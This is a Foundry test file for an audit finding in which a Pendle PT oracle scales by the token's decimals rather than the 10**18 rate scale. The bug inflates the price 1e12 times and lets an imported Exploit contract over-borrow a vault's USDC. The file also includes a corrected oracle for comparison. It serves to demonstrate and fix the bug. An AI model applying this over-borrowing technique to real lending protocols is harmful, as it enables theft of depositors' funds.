// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    IBaseToUSD,
    IPendleMarket,
    IPendleOracle,
    IERC20Decimals
} from "./35122-h-9-wrong-decimal-precision-resulted-in-the-price-being-infl.sol";

/// Same reads as PendlePTOracle. Divisor is 10**18, the Pendle rate scale, not 10**ptDecimals.
contract PendlePTOracleFixed {
    IBaseToUSD public baseToUSDOracle;
    IPendleOracle public pendleOracle;
    address public pendleMarket;
    int256 public baseToUSDDecimals;
    int256 public ptDecimals;
    int256 public constant rateDecimals = 10**18;

    constructor(address feeds, address pendle, address market) {
        baseToUSDOracle = IBaseToUSD(feeds);
        pendleOracle = IPendleOracle(pendle);
        pendleMarket = market;
        uint8 _baseDecimals = baseToUSDOracle.decimals();
        (/* */, address pt, /* */) = IPendleMarket(market).readTokens();
        uint8 _ptDecimals = IERC20Decimals(pt).decimals();
        baseToUSDDecimals = int256(10**_baseDecimals);
        ptDecimals = int256(10**_ptDecimals);
    }

    function latestAnswer() external view returns (int256 answer) {
        (, int256 baseToUSD,,,) = baseToUSDOracle.latestRoundData();
        require(baseToUSD > 0, "Chainlink Rate Error");
        int256 ptRate = int256(pendleOracle.getPtToAssetRate(pendleMarket, 1800));
        int256 rateScale = int256(10**18);
        answer = (ptRate * baseToUSD * rateScale) / (baseToUSDDecimals * rateScale);
    }
}

contract Finding35122Test is Test {
    function test_exploit_inflated_price_overborrows() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.usdc().balanceOf(address(e)), e.BUGGY_BORROW(), "stolen USDC");
        assertGt(e.usdc().balanceOf(address(e)), e.FAIR_BORROW() * 1e12, "orders of magnitude over fair");
        assertEq(e.usdc().balanceOf(address(e.vault())) + e.BUGGY_BORROW(), e.SEED(), "vault paid the borrow");
    }

    function test_control_correct_scale_matches_fair_value() public {
        Exploit e = new Exploit();
        assertEq(e.oracle().ptDecimals(), int256(10**6), "stored scale is 10**pt decimals");
        assertEq(e.oracle().rateDecimals(), int256(10**18), "pendle rate scale");
        assertEq(e.oracle().baseToUSDDecimals(), int256(10**8), "chainlink scale");

        PendlePTOracleFixed fixedOracle = new PendlePTOracleFixed(address(e.feeds()), address(e.pendle()), address(e.market()));
        assertEq(fixedOracle.ptDecimals(), int256(10**6), "control still sees 6-decimal PT");
        assertEq(fixedOracle.latestAnswer(), e.FAIR_PRICE(), "fair price");
        assertEq(e.oracle().latestAnswer(), e.BUGGY_PRICE(), "buggy price");
        assertEq(uint256(e.oracle().latestAnswer()) / uint256(fixedOracle.latestAnswer()), 1e12, "1e12 inflation");

        uint256 fairBorrow = e.vault().quoteBorrow(fixedOracle.latestAnswer(), e.ONE_PT());
        uint256 buggyBorrow = e.vault().quoteBorrow(e.oracle().latestAnswer(), e.ONE_PT());
        assertEq(fairBorrow, e.FAIR_BORROW(), "fair borrow of 1 PT");
        assertEq(buggyBorrow, e.BUGGY_BORROW(), "inflated borrow limit");
        assertGt(buggyBorrow, fairBorrow, "wrong decimals change the borrow limit");
    }
}
